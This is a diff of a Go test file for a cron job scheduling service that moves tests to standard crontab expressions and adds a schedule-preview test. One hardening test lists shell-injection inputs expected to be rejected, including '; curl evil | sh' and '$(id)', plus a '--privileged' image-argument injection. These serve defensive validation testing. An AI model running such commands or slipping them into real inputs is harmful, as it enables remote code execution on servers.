@@ -90,8 +90,8 @@ func TestParseSchedule(t *testing.T) {
 	}{
 		{"*/5 * * * *", true, "5 段式"},
 		{"0 3 * * *", true, "每日 3 点"},
-		{"@every 1h", true, "固定间隔"},
-		{"@every 30s", false, "间隔小于 1 分钟"},
+		{"30 8 * * 1-5", true, "工作日早上"},
+		{"@every 1h", false, "@ 描述符不收（只支持标准 crontab）"},
 		{"bad expr", false, "非法表达式"},
 		{"* * * *", false, "4 段不合法"},
 	}
@@ -135,7 +135,7 @@ func TestSaveJobValidatesAndSchedules(t *testing.T) {
 	ctx := context.Background()
 
 	in := JobInput{
-		Name: "cleanup", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Name: "cleanup", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "alpine:3", Enabled: boolPtr(true),
 	}
 	job, err := svc.SaveJob(ctx, 0, in, "tester")
@@ -149,7 +149,7 @@ func TestSaveJobValidatesAndSchedules(t *testing.T) {
 	// compose-run 脚本 + run 载体：矩阵拒绝
 	cr := mustScript(t, svc, ScriptComposeRun)
 	_, err = svc.SaveJob(ctx, 0, JobInput{
-		Name: "bad", ScriptID: cr.ID, Schedule: "@every 1h", ServerID: 1,
+		Name: "bad", ScriptID: cr.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "alpine:3",
 	}, "tester")
 	if err == nil {
@@ -184,7 +184,7 @@ func TestDeleteScriptBlockedWhenBound(t *testing.T) {
 	sc := mustScript(t, svc, ScriptShell)
 	ctx := context.Background()
 	if _, err := svc.SaveJob(ctx, 0, JobInput{
-		Name: "j", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Name: "j", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "alpine:3",
 	}, "t"); err != nil {
 		t.Fatalf("建任务失败: %v", err)
@@ -202,7 +202,7 @@ func TestForbidSkipsWhenRunning(t *testing.T) {
 	sc := mustScript(t, svc, ScriptShell)
 	ctx := context.Background()
 	svc.db.Create(&CronJob{
-		Name: "j", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Name: "j", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "alpine:3", Enabled: true, TimeoutSecs: 600,
 	})
 	var job CronJob
@@ -234,7 +234,7 @@ func TestTriggerExecutesAndAudits(t *testing.T) {
 	sc := mustScript(t, svc, ScriptShell)
 	ctx := context.Background()
 	job, err := svc.SaveJob(ctx, 0, JobInput{
-		Name: "j", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 7,
+		Name: "j", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 7,
 		Carrier: CarrierRun, Image: "alpine:3", Command: "--dry-run",
 	}, "tester")
 	if err != nil {
@@ -302,7 +302,7 @@ func TestScanDueDispatchAndMissed(t *testing.T) {
 	// 30 分钟前已到点 → missed
 	past := time.Now().Add(-30 * time.Minute)
 	svc.db.Create(&CronJob{
-		Name: "missed", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Name: "missed", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "alpine:3", Enabled: true, NextRunAt: &past,
 	})
 	if err := svc.scanDue(ctx); err != nil {
@@ -328,7 +328,7 @@ func TestScanDueDispatchAndMissed(t *testing.T) {
 	// 刚到点 → 正常分发执行
 	now := time.Now().Add(-5 * time.Second)
 	svc.db.Create(&CronJob{
-		Name: "due", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Name: "due", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "alpine:3", Enabled: true, NextRunAt: &now,
 	})
 	if err := svc.scanDue(ctx); err != nil {
@@ -394,7 +394,7 @@ func TestExecuteTimeoutKills(t *testing.T) {
 
 func boolPtr(b bool) *bool { return &b }
 
-// Command 注入面：shell 元字符拒绝；@every 多段时长；镜像前导 - 拒绝。
+// Command 注入面：shell 元字符拒绝；@ 描述符拒绝；镜像前导 - 拒绝。
 func TestCronInputHardening(t *testing.T) {
 	svc, _ := newSvc(t)
 	sc := mustScript(t, svc, ScriptShell)
@@ -402,20 +402,20 @@ func TestCronInputHardening(t *testing.T) {
 
 	for _, badCmd := range []string{"; curl evil | sh", "`id`", "$(id)", "a && b", "a || b"} {
 		_, err := svc.SaveJob(ctx, 0, JobInput{
-			Name: "j", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+			Name: "j", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 			Carrier: CarrierRun, Image: "alpine:3", Command: badCmd,
 		}, "t")
 		if err == nil {
 			t.Errorf("Command %q 应被拒绝", badCmd)
 		}
 	}
-	// 多段 @every 合法
-	if _, err := parseSchedule("@every 1h30m", time.Now()); err != nil {
-		t.Errorf("多段 @every 应合法: %v", err)
+	// @ 描述符拒绝
+	if _, err := parseSchedule("@daily", time.Now()); err == nil {
+		t.Error("@daily 应被拒绝（只支持标准 5 段）")
 	}
 	// 前导 - 镜像拒绝（--privileged 注入）
 	_, err := svc.SaveJob(ctx, 0, JobInput{
-		Name: "j2", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Name: "j2", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "--privileged",
 	}, "t")
 	if err == nil {
@@ -439,7 +439,7 @@ func TestTruncateUTF8(t *testing.T) {
 func TestDeleteJobBlockedWhileRunning(t *testing.T) {
 	svc, _ := newSvc(t)
 	sc := mustScript(t, svc, ScriptShell)
-	svc.db.Create(&CronJob{ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+	svc.db.Create(&CronJob{ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "alpine:3", Name: "j"})
 	svc.db.Create(&CronRun{JobID: 1, Status: RunRunning, StartedAt: time.Now()})
 	if err := svc.DeleteJob(context.Background(), 1); err == nil {
@@ -453,7 +453,7 @@ func TestSaveJobDisabledCreate(t *testing.T) {
 	svc, _ := newSvc(t)
 	sc := mustScript(t, svc, ScriptShell)
 	job, err := svc.SaveJob(context.Background(), 0, JobInput{
-		Name: "off", ScriptID: sc.ID, Schedule: "@every 1h", ServerID: 1,
+		Name: "off", ScriptID: sc.ID, Schedule: "0 3 * * *", ServerID: 1,
 		Carrier: CarrierRun, Image: "alpine:3", Enabled: boolPtr(false),
 	}, "t")
 	if err != nil {
@@ -466,5 +466,31 @@ func TestSaveJobDisabledCreate(t *testing.T) {
 	}
 	if got.NextRunAt != nil {
 		t.Fatalf("禁用任务不应推进 next_run_at: %v", got.NextRunAt)
+	}
+}
+
+// SchedulePreview：未来 N 次触发时间单调递增且符合表达式。
+func TestSchedulePreview(t *testing.T) {
+	svc, _ := newSvc(t)
+	times, err := svc.SchedulePreview("*/5 * * * *", 5)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(times) != 5 {
+		t.Fatalf("应返回 5 次, got %d", len(times))
+	}
+	for i := 1; i < len(times); i++ {
+		if !times[i].After(times[i-1]) {
+			t.Fatalf("触发时间应递增: %v -> %v", times[i-1], times[i])
+		}
+		if times[i].Minute()%5 != 0 {
+			t.Fatalf("应落在 5 分钟边界: %v", times[i])
+		}
+	}
+	if _, err := svc.SchedulePreview("@every 1h", 5); err == nil {
+		t.Error("@ 描述符应被拒绝")
+	}
+	if _, err := svc.SchedulePreview("bad", 5); err == nil {
+		t.Error("非法表达式应被拒绝")
 	}
 }
